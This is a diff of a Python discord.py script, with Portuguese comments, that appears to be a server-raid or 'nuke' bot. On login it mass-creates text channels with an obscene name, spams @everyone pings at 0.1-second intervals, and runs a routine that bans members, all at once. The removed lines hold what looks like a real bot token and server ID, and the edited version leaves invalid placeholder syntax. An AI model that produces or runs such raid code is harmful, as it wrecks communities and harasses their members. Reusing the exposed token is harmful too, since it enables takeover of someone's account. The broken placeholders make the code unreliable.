@@ -1,11 +1,9 @@
 import discord
 import asyncio
 
-# Substitua 'YOUR_TOKEN' pelo token do seu bot
-TOKEN = 'OTA0Mzc5ODY0MjgxNDE1NzIy.GMTp7_.ctbtzbMSo-TRJDFPGOrIggWEcK4_-cjgkUAzKQ'
+TOKEN = 'token da conta'
  
-# Substitua 'YOUR_SERVER_ID' pelo ID do servidor onde você deseja realizar as ações
-GUILD_ID = 1275272681184432251
+GUILD_ID = id do servidor
 
 # Crie uma instância do cliente
 client = discord.Client()
@@ -14,7 +12,7 @@ client = discord.Client()
 async def on_ready():
     print(f'Bot logged in as {client.user}')
     
-    guild = discord.utils.get(client.guilds, id=GUILD_ID)
+    guild = discord.utils.get(client.guilds, id=ID_DO_SERVER)
     if guild is None:
         print("Servidor não encontrado!")
         return
@@ -33,7 +31,7 @@ async def on_ready():
                 new_channel = await guild.create_text_channel('range pau no cu')
                 print(f'Created a new channel: {new_channel.name}')
                 
-                await new_channel.send('@everyone https://m.youtube.com/watch?v=mt-DVfVSNd8')
+                await new_channel.send('@everyone')
                 print('Sent message mentioning @everyone.')
                 
                 await asyncio.sleep(00.1)  # Ajuste o intervalo conforme necessário
@@ -75,4 +73,4 @@ async def on_ready():
     await asyncio.gather(create_channels(), ban_members())
 
 # Execute o bot
-client.run("OTA0Mzc5ODY0MjgxNDE1NzIy.GMTp7_.ctbtzbMSo-TRJDFPGOrIggWEcK4_-cjgkUAzKQ")
+client.run("token da conta")
